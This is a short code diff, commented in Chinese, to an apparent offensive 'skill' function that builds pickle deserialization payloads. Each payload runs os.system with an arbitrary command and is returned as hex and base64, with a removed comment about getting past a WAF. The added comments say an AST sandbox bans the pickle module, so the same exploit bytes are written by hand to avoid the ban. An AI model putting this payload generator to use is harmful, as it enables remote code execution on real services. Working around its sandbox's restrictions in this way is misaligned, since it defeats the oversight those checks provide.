@@ -23,7 +23,6 @@ from __future__ import annotations
 
 import base64
 import os
-import pickle
 import re
 from pathlib import Path
 
@@ -141,11 +140,17 @@ def build_pickle_payload(cmd: str) -> dict:
     if not cmd or not isinstance(cmd, str):
         return {"ok": False, "reason": "bad_cmd"}
 
-    class _Exploit:
-        def __reduce__(self):
-            return (os.system, (cmd,))
-
-    raw = pickle.dumps(_Exploit(), protocol=0)  # protocol 0 纯文本，便于手工改造/过 WAF
+    # 手写 protocol 0 的 __reduce__ 字节流，等价于 pickle.dumps(_Exploit(), 0)。
+    # 为什么不再 import pickle：AST 沙箱禁 pickle 族（loads 可执行任意对象），
+    # 而本 skill 只需**序列化**，不需要反序列化。protocol 0 语法：
+    #     c<module>\n<name>\n  +  (  +  V<unicode>\n  +  t  +  R  +  .
+    # 即 GLOBAL(os, system) → MARK → UNICODE(cmd) → TUPLE → REDUCE → STOP。
+    # 注意 V(UNICODE) 在 protocol 0 里以 \n 收尾、不写长度，故 cmd 内的
+    # 换行须转义成 \u000a，否则载荷会在换行处被截断。
+    # 模块名用 os 而非 posix/nt：os.system 三平台均可解析（posix/nt 是平台别名，
+    # 真 pickle 会在 Linux 写 posix、Windows 写 nt，故不追求与其逐字节相同）。
+    esc = (cmd.replace("\n", "\\u000a").replace("\r", "\\u000d"))
+    raw = b"cos\nsystem\n(V" + esc.encode("utf-8", "surrogateescape") + b"\ntR."
     return {"ok": True, "bytes": len(raw),
             "payload_hex": raw.hex(),
             "payload_b64": base64.b64encode(raw).decode("ascii"),
